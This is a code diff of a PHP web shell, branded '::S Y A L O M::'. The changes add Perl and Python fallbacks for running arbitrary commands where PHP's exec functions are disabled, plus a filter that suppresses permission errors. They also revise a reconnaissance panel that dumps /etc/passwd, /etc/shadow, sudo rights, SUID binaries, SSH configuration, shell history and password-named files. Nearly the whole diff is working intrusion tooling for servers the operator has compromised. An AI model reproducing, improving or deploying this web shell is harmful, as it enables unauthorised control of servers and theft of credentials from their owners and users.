@@ -567,42 +567,103 @@ function execute_shell_command($cmd) {
         @unlink($tmpfile);
     }
     
+    // If all methods failed, try alternative approaches
+    
+    // Method 9: Try using Perl if available
+    if (is_function_available('perl')) {
+        $methods_tried[] = "perl";
+        $tmpfile = tempnam(sys_get_temp_dir(), 'pl');
+        file_put_contents($tmpfile, '#!/usr/bin/perl
+print `' . $cmd . ' 2>&1`;
+');
+        $output = @shell_exec("perl " . escapeshellarg($tmpfile) . " 2>&1");
+        @unlink($tmpfile);
+        if (!empty($output)) {
+            return $output;
+        }
+    }
+    
+    // Method 10: Try using Python if available
+    if (is_function_available('python') || is_function_available('python3')) {
+        $methods_tried[] = "python";
+        $py = is_function_available('python3') ? 'python3' : 'python';
+        $tmpfile = tempnam(sys_get_temp_dir(), 'py');
+        file_put_contents($tmpfile, 'import subprocess; print(subprocess.check_output("' . addslashes($cmd) . '", shell=True, stderr=subprocess.STDOUT).decode())');
+        $output = @shell_exec($py . " " . escapeshellarg($tmpfile) . " 2>&1");
+        @unlink($tmpfile);
+        if (!empty($output) && strpos($output, 'Error') === false) {
+            return $output;
+        }
+    }
+    
     // If all methods failed
     $disabled_funcs = ini_get('disable_functions');
     return "Error: All shell execution methods failed or are disabled.\n\nMethods tried: " . implode(", ", $methods_tried) . "\nDisabled functions: " . ($disabled_funcs ? $disabled_funcs : "None listed in disable_functions") . "\n\nPossible solutions:\n1. Use PHP file functions for basic operations\n2. Try using SQL queries if database is available\n3. Look for other entry points (cron, scheduled tasks)\n4. Check for bypass techniques specific to this server\n5. Consider using alternative shells (Perl, Python, etc.)";
 }
 
+// Helper function to filter out permission denied and not found errors
+function filter_command_output($output) {
+    if (empty($output)) return "(No output)";
+    
+    $lines = explode("\n", $output);
+    $filtered = [];
+    $skip_patterns = [
+        '/Permission denied/i',
+        '/No such file or directory/i',
+        '/cannot access/i',
+        '/not accessible/i',
+        '/Operation not permitted/i',
+        '/Input\/output error/i',
+        '/Invalid argument/i'
+    ];
+    
+    foreach ($lines as $line) {
+        $skip = false;
+        foreach ($skip_patterns as $pattern) {
+            if (preg_match($pattern, $line)) {
+                $skip = true;
+                break;
+            }
+        }
+        if (!$skip) {
+            $filtered[] = $line;
+        }
+    }
+    
+    return implode("\n", $filtered) ?: "(No valid output)";
+}
+
 function get_detailed_server_info() {
     $info = "";
-    $info .= "<div class='info-group'><strong title='Shows detailed kernel and OS information.'>Kernel Info:</strong><pre>" . htmlspecialchars(execute_shell_command("uname -a && echo '[+] Dmesg (last 20 lines):' && dmesg | tail -n 20")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Shows all configurable kernel variables.'>Sysctl Variables:</strong><pre>" . htmlspecialchars(execute_shell_command("sysctl -a 2>/dev/null | head -n 50")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Current user identity and group ID.'>User & ID:</strong><pre>" . htmlspecialchars(execute_shell_command("whoami && id")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Shows commands the current user can run with sudo.'>Sudo Rights:</strong><pre>" . htmlspecialchars(execute_shell_command("sudo -l 2>/dev/null || echo 'Sudo not accessible or no rights.'")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='List of all users on the system.'>/etc/passwd:</strong><pre>" . htmlspecialchars(execute_shell_command("cat /etc/passwd")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='List of all groups on the system.'>/etc/group:</strong><pre>" . htmlspecialchars(execute_shell_command("cat /etc/group")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Attempts to read the password hash file (usually fails, but worth a try).'>/etc/shadow:</strong><pre>" . htmlspecialchars(execute_shell_command("cat /etc/shadow 2>/dev/null || echo 'Cannot read /etc/shadow.'")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Network interface configuration and IP addresses.'>Network Interfaces:</strong><pre>" . htmlspecialchars(execute_shell_command("ip a")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Shows active TCP/UDP connections and open ports.'>Active Connections:</strong><pre>" . htmlspecialchars(execute_shell_command("ss -tulpn")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='ARP table to see IP to MAC address mapping.'>ARP Table:</strong><pre>" . htmlspecialchars(execute_shell_command("arp -a")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Kernel routing table.'>Routing Table:</strong><pre>" . htmlspecialchars(execute_shell_command("route -n")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Shows all running processes.'>Running Processes:</strong><pre>" . htmlspecialchars(execute_shell_command("ps aux")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Shows a snapshot of CPU and memory usage.'>Top Snapshot:</strong><pre>" . htmlspecialchars(execute_shell_command("top -bn1")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Shows running services (if using systemd).'>Running Services (systemd):</strong><pre>" . htmlspecialchars(execute_shell_command("systemctl list-units -type=service -state=running -no-pager 2>/dev/null || echo 'systemctl not found.'")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='View current user\'s crontab.'>User Crontab:</strong><pre>" . htmlspecialchars(execute_shell_command("crontab -l 2>/dev/null || echo 'No crontab for this user.'")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Finds all cron files on the system.'>System Crons:</strong><pre>" . htmlspecialchars(execute_shell_command("ls -la /etc/cron* 2>/dev/null")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Disk usage on all filesystems.'>Disk Usage:</strong><pre>" . htmlspecialchars(execute_shell_command("df -h")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Shows all mounted filesystems.'>Mounted Filesystems:</strong><pre>" . htmlspecialchars(execute_shell_command("mount")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Finds files with SUID bit. If exploited, can give root access.'>SUID Files:</strong><pre>" . htmlspecialchars(execute_shell_command("find / -perm -4000 -type f 2>/dev/null")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Finds files with SGID bit.'>SGID Files:</strong><pre>" . htmlspecialchars(execute_shell_command("find / -perm -2000 -type f 2>/dev/null")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Finds files writable by anyone.'>World-Writable Files:</strong><pre>" . htmlspecialchars(execute_shell_command("find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -n 20")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='PHP version and configuration.'>PHP Config:</strong><pre>Disable Functions: " . htmlspecialchars(ini_get('disable_functions')) . "\nPHP INI Path: " . htmlspecialchars(php_ini_loaded_file()) . "\n" . htmlspecialchars(execute_shell_command("php -i | grep 'Configuration File'")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Searches for common software versions on the server.'>Software Versions:</strong><pre>" . htmlspecialchars(execute_shell_command("python -version 2>&1 && python3 -version 2>&1 && perl -v | head -n 2 && ruby -v 2>&1 && gcc -version | head -n 1 && nginx -v 2>&1 && apache2 -v 2>&1 || httpd -v 2>&1")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Lists other users\' home directories.'>/home Directories:</strong><pre>" . htmlspecialchars(execute_shell_command("ls -la /home/ 2>/dev/null")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Attempts to list the root directory.'>/root Directory:</strong><pre>" . htmlspecialchars(execute_shell_command("ls -la /root/ 2>/dev/null || echo 'Cannot access /root.'")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Views SSH configuration.'>SSH Config:</strong><pre>" . htmlspecialchars(execute_shell_command("ls -la /etc/ssh/ 2>/dev/null && cat /etc/ssh/sshd_config 2>/dev/null")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Searches for interesting configuration files.'>Config Files:</strong><pre>" . htmlspecialchars(execute_shell_command("find / -type f -name '*.conf' 2>/dev/null | head -n 20")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Searches for files containing keywords like password.'>Password Files:</strong><pre>" . htmlspecialchars(execute_shell_command("find / -type f -name '*.pwd' -o -name '*password*' 2>/dev/null | head -n 20")) . "</pre></div>";
-    $info .= "<div class='info-group'><strong title='Views user shell command history.'>History Files:</strong><pre>" . htmlspecialchars(execute_shell_command("cat ~/.bash_history 2>/dev/null && echo '--' && cat ~/.nano_history 2>/dev/null")) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Shows detailed kernel and OS information.'>Kernel Info:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("uname -a && echo '[+] Dmesg (last 20 lines):' && dmesg 2>/dev/null | tail -n 20"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Shows all configurable kernel variables.'>Sysctl Variables:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("sysctl -a 2>/dev/null | head -n 50"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Current user identity and group ID.'>User & ID:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("whoami && id"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Shows commands the current user can run with sudo.'>Sudo Rights:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("sudo -l 2>/dev/null || echo 'Sudo not accessible or no rights.'"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='List of all users on the system.'>/etc/passwd:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("cat /etc/passwd 2>/dev/null || echo 'Cannot read /etc/passwd'"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='List of all groups on the system.'>/etc/group:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("cat /etc/group 2>/dev/null || echo 'Cannot read /etc/group'"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Attempts to read the password hash file (usually fails, but worth a try).'>/etc/shadow:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("cat /etc/shadow 2>/dev/null || echo 'Cannot read /etc/shadow.'"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Network interface configuration and IP addresses.'>Network Interfaces:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ip a 2>/dev/null || ifconfig 2>/dev/null || echo 'No network info available'"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Shows active TCP/UDP connections and open ports.'>Active Connections:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null || echo 'No socket info available'"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='ARP table to see IP to MAC address mapping.'>ARP Table:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("arp -a 2>/dev/null || ip neigh 2>/dev/null || echo 'No ARP info'"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Kernel routing table.'>Routing Table:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("route -n 2>/dev/null || ip route 2>/dev/null || echo 'No routing info'"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Shows all running processes.'>Running Processes:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ps aux 2>/dev/null | head -50"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Shows a snapshot of CPU and memory usage.'>Top Snapshot:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("top -bn1 2>/dev/null | head -30"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Shows running services (if using systemd).'>Running Services (systemd):</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("systemctl list-units --type=service --state=running --no-pager 2>/dev/null | head -20 || echo 'systemctl not found.'"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='View current user\'s crontab.'>User Crontab:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("crontab -l 2>/dev/null || echo 'No crontab for this user.'"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Finds all cron files on the system.'>System Crons:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ls -la /etc/cron* /var/spool/cron 2>/dev/null"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Disk usage on all filesystems.'>Disk Usage:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("df -h 2>/dev/null"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Shows all mounted filesystems.'>Mounted Filesystems:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("mount 2>/dev/null"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Finds files with SUID bit. If exploited, can give root access.'>SUID Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /usr /bin /sbin /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Finds files with SGID bit.'>SGID Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /usr /bin /sbin /usr/bin /usr/sbin -perm -2000 -type f 2>/dev/null"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Finds files writable by anyone.'>World-Writable Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /tmp /var/tmp -writable -type f 2>/dev/null | head -n 20"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='PHP version and configuration.'>PHP Config:</strong><pre>Disable Functions: " . htmlspecialchars(ini_get('disable_functions')) . "\nPHP INI Path: " . htmlspecialchars(php_ini_loaded_file() ?: 'Unknown') . "\n" . htmlspecialchars(filter_command_output(execute_shell_command("php -i 2>/dev/null | grep 'Configuration File'"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Searches for common software versions on the server.'>Software Versions:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("python --version 2>&1; python3 --version 2>&1; perl -v 2>/dev/null | head -n 2; ruby -v 2>&1; gcc --version 2>/dev/null | head -n 1; nginx -v 2>&1; apache2 -v 2>&1 || httpd -v 2>&1"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Lists other users\' home directories.'>/home Directories:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ls -la /home/ 2>/dev/null"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Attempts to list the root directory.'>/root Directory:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ls -la /root/ 2>/dev/null || echo 'Cannot access /root.'"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Views SSH configuration.'>SSH Config:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ls -la /etc/ssh/ 2>/dev/null; echo '---'; cat /etc/ssh/sshd_config 2>/dev/null | head -50"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Searches for interesting configuration files.'>Config Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /etc /usr/local/etc -type f -name '*.conf' 2>/dev/null | head -n 20"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Searches for files containing keywords like password.'>Password Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /etc -type f \( -name '*.pwd' -o -name '*password*' \) 2>/dev/null | head -n 20"))) . "</pre></div>";
+    $info .= "<div class='info-group'><strong title='Views user shell command history.'>History Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("cat ~/.bash_history 2>/dev/null | tail -50; echo '--'; cat ~/.nano_history 2>/dev/null | tail -20"))) . "</pre></div>";
     return $info;
 }
 if (isset($_POST['action']) && $_POST['action'] === 'chmod') {
@@ -3035,7 +3096,8 @@ function list_dir($path) {
         .modal-header h3 { margin: 0; border: none; }
         .modal-body { max-height: 60vh; overflow-y: auto; }
         .modal-footer { margin-top: 15px; text-align: right; }
-        #viewContent, #shellOutput, #serverInfoContent, #searchResultsContent { background: #111; padding: 10px; border: 1px solid #0f0; max-height: 400px; overflow: auto; white-space: pre-wrap; word-wrap: break-word; }
+        #viewContent, #serverInfoContent, #searchResultsContent { background: #111; padding: 10px; border: 1px solid #0f0; max-height: 400px; overflow: auto; white-space: pre-wrap; word-wrap: break-word; }
+        #shellOutput { background: #111; padding: 10px; border: 1px solid #0f0; max-height: 70vh; overflow: auto; white-space: pre-wrap; word-wrap: break-word; }
         .modal textarea { width: 100%; height: 300px; }
         .modal.active { display: flex; }
         .shell-shortcuts { margin-top: 0; flex: 1; overflow: hidden; display: flex; flex-direction: column; }
@@ -3156,7 +3218,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M:: ~ 280326 1704</h1>
+        <h1>::S Y A L O M:: ~ 280326 1715</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
